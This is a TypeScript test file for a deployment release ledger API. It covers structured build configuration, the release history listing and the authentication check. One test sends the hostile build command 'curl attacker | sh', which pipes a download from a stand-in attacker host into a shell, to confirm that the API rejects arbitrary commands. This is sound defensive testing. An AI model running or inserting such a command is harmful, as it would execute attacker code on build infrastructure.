import assert from "node:assert/strict";
import { test } from "node:test";
import Fastify from "fastify";
import { ZodError } from "zod";
import { createAccessToken } from "../auth/tokens.js";
import type { DatabaseClient } from "../db/client.js";
import { users } from "../db/schema.js";
import type {
  ApplicationReleaseRecord,
  ProjectDeploymentTargetRecord,
  ProjectReleaseLedgerRepository
} from "../releases/project-release-ledger-service.js";
import { registerProjectReleaseLedgerRoutes } from "./project-release-ledger.js";

process.env.NODE_ENV = "test";
process.env.AUTH_TOKEN_SECRET = "test-auth-token-secret-with-at-least-32-characters";

const projectId = "11111111-1111-4111-8111-111111111111";
const userId = "22222222-2222-4222-8222-222222222222";
const connectionId = "33333333-3333-4333-8333-333333333333";
const now = new Date("2026-07-14T00:00:00.000Z");

test("project deployment target API persists only structured confirmed build configuration", async (t) => {
  const state = createRepositoryState();
  const app = await buildRouteApp(state.repository);
  t.after(() => app.close());

  const response = await app.inject({
    method: "PUT",
    url: `/api/projects/${projectId}/deployment-target`,
    headers: await authHeaders(),
    payload: createTargetPayload()
  });

  assert.equal(response.statusCode, 200);
  assert.equal(response.json().target.runtimeTargetKind, "ecs_fargate");
  assert.equal(state.target?.confirmedBuildConfig?.buildPreset, "docker_build");

  const arbitraryCommandResponse = await app.inject({
    method: "PUT",
    url: `/api/projects/${projectId}/deployment-target`,
    headers: await authHeaders(),
    payload: { ...createTargetPayload(), buildCommand: "curl attacker | sh" }
  });
  assert.equal(arbitraryCommandResponse.statusCode, 400);
});

test("release API returns Direct and GitOps rows from one project history", async (t) => {
  const state = createRepositoryState();
  state.releases.push(
    createReleaseRecord({ id: "44444444-4444-4444-8444-444444444444", source: "direct" }),
    createReleaseRecord({ id: "55555555-5555-4555-8555-555555555555", source: "gitops" })
  );
  const app = await buildRouteApp(state.repository);
  t.after(() => app.close());

  const response = await app.inject({
    method: "GET",
    url: `/api/projects/${projectId}/releases`,
    headers: await authHeaders()
  });

  assert.equal(response.statusCode, 200);
  assert.deepEqual(response.json().releases.map((item: { source: string }) => item.source), [
    "direct",
    "gitops"
  ]);
  assert.equal(response.json().releases[0].createdAt, now.toISOString());
});

test("release ledger API requires an active authenticated user", async (t) => {
  const app = await buildRouteApp(createRepositoryState().repository);
  t.after(() => app.close());

  const response = await app.inject({
    method: "GET",
    url: `/api/projects/${projectId}/deployment-target`
  });

  assert.equal(response.statusCode, 401);
});

function createRepositoryState() {
  const state: {
    target: ProjectDeploymentTargetRecord | undefined;
    releases: ApplicationReleaseRecord[];
    repository: ProjectReleaseLedgerRepository;
  } = {
    target: undefined,
    releases: [],
    repository: undefined as unknown as ProjectReleaseLedgerRepository
  };
  state.repository = {
    async findAccessibleProject(candidateProjectId, candidateUserId) {
      return candidateProjectId === projectId && candidateUserId === userId
        ? { id: projectId }
        : undefined;
    },
    async findVerifiedConnection(candidateConnectionId, candidateUserId) {
      return candidateConnectionId === connectionId && candidateUserId === userId
        ? { id: connectionId, region: "ap-northeast-2" }
        : undefined;
    },
    async findProjectDeploymentTarget() {
      return state.target;
    },
    async saveProjectDeploymentTarget(input) {
      state.target = {
        ...input,
        createdAt: state.target?.createdAt ?? input.updatedAt
      };
      return state.target;
    },
    async findDeploymentInProject() {
      return undefined;
    },
    async findPipelineRunInProject() {
      return undefined;
    },
    async createApplicationRelease() {
      throw new Error("not used");
    },
    async listProjectApplicationReleases() {
      return state.releases;
    },
    async findProjectApplicationRelease(_projectId, releaseId) {
      return state.releases.find((item) => item.id === releaseId);
    }
  };
  return state;
}

async function buildRouteApp(repository: ProjectReleaseLedgerRepository) {
  const app = Fastify({ logger: false });
  const authDb = createFakeAuthDatabaseClient();
  app.setErrorHandler((error, _request, reply) => {
    if (error instanceof ZodError) {
      return reply.status(400).send({ error: "bad_request", message: error.message });
    }
    const statusCode = typeof error === "object" && error !== null &&
      "statusCode" in error && typeof error.statusCode === "number"
      ? error.statusCode
      : 500;
    return reply.status(statusCode).send({
      error: "request_failed",
      message: error instanceof Error ? error.message : "Request failed"
    });
  });
  await app.register(registerProjectReleaseLedgerRoutes, {
    prefix: "/api",
    getDatabaseClient: () => authDb,
    createRepository: () => repository
  });
  return app;
}

function createFakeAuthDatabaseClient(): DatabaseClient {
  const user = {
    id: userId,
    username: "release-user",
    email: "release@example.com",
    nickname: "Release User",
    passwordHash: null,
    createdAt: now,
    updatedAt: now,
    deletedAt: null
  };
  const query = {
    from: (table: unknown) => ({
      where: async () => (table === users ? [user] : [])
    })
  };
  return {
    db: { select: () => query } as unknown as DatabaseClient["db"],
    pool: { end: async () => undefined } as DatabaseClient["pool"]
  };
}

async function authHeaders() {
  return { authorization: `Bearer ${await createAccessToken(userId)}` };
}

function createTargetPayload() {
  return {
    provider: "aws",
    connectionId,
    region: "ap-northeast-2",
    runtimeTargetKind: "ecs_fargate",
    rolloutStrategy: "all_at_once",
    confirmedBuildConfig: {
      sourceRoot: ".",
      evidence: [{ kind: "dockerfile", path: "Dockerfile" }],
      installPreset: "none",
      buildPreset: "docker_build",
      artifactOutputPath: null,
      runtimeEntrypoint: null,
      healthCheckPath: "/health",
      dockerfilePath: "Dockerfile",
      packageManifestPath: null,
      samTemplatePath: null,
      appSpecPath: null,
      staticOutputPath: null,
      exactSemVerTag: "v1.0.0",
      manifestVersion: "1.0.0",
      confirmedCommitSha: "a".repeat(40),
      confirmedAt: now.toISOString()
    }
  };
}

function createReleaseRecord(
  overrides: Pick<ApplicationReleaseRecord, "id" | "source">
): ApplicationReleaseRecord {
  return {
    id: overrides.id,
    projectId,
    deploymentId: overrides.source === "direct" ? crypto.randomUUID() : null,
    pipelineRunId: overrides.source === "gitops" ? crypto.randomUUID() : null,
    source: overrides.source,
    runtimeTargetKind: "ecs_fargate",
    version: "v1.0.0",
    commitSha: "a".repeat(40),
    artifactDigestAlgorithm: "sha256",
    artifactDigest: "b".repeat(64),
    providerRevision: null,
    outputUrl: "https://api.example.com",
    status: "succeeded",
    healthEvidence: { state: "healthy" },
    rollbackEvidence: null,
    startedAt: now,
    completedAt: now,
    createdAt: now,
    updatedAt: now
  };
}
